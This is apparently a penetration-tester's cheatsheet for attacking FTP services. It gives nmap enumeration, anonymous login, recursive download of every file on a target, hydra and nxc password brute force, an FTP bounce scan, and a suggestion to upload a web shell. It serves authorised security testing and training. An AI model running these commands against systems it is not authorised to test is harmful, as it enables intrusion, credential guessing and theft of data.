# FTP (21)

[[09 - Service Cheatsheets/00 - README|Folder index]]

## Attacker Mindset

File transfer in cleartext. Often misconfigured. Anonymous access is common on older systems, IoT devices, and forgotten staging boxes. If you see this, think: credentials in transit, file exfil staging, or misconfigured permissions. Pair it with a web server on the same host and a writable directory = upload a web shell to FTP, execute via HTTP. **Common attack vectors:** anonymous login, brute force, cleartext credential sniff, FTP bounce attacks, malicious file upload.

## Enumerate

```bash
nmap -sV -sC -p 21 $IP
nmap --script ftp-* -p 21 $IP
```

## Anonymous login

```bash
ftp $IP
# Username: anonymous
# Password: (blank or any email)

# Or with lftp
lftp $IP -u anonymous,
```

## Download everything

```bash
wget -r ftp://anonymous:@$IP/
# Or inside ftp client:
binary
prompt OFF
mget *
```

## Brute-force

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://$IP -t 16
nxc ftp $IP -u users.txt -p passwords.txt
```

## FTP bounce attack

```bash
nmap -b anonymous:@$IP:21 target_ip
```
